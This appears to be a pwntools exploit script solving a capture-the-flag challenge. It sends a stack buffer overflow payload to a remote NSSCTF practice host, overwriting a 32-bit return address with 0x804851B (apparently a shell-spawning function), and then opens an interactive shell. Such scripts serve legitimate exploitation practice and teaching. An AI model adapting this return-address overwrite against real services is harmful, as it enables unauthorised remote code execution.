from pwn import *

#io = process("./service")
io = remote("node5.anna.nssctf.cn", 23872)

shell_addr = 0x804851B

payload = b"a" * (0x18 + 0x4) + p32(shell_addr)

io.send(payload)
io.interactive()
